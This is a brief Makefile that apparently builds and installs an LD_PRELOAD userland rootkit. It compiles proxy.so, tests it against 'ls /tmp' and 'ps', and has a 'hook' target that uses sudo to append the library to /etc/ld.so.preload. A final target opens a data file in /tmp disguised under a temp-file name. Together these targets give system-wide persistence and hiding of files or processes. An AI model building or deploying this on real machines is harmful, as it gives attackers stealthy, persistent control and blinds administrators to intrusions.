proxy:
	gcc db.c proxy.c -D_GNU_SOURCE -fPIC -L. -ldl -shared -o proxy.so

all: proxy

clean:
	rm -f *.o *.a *.so

ls:
	LD_PRELOAD=./proxy.so ls /tmp

ps:
	LD_PRELOAD=./proxy.so ps

hook:
	sudo bash -c 'echo "$$PWD/proxy.so" >> /etc/ld.so.preload'

db:
	vim /tmp/ccr0J61R.txt.swp
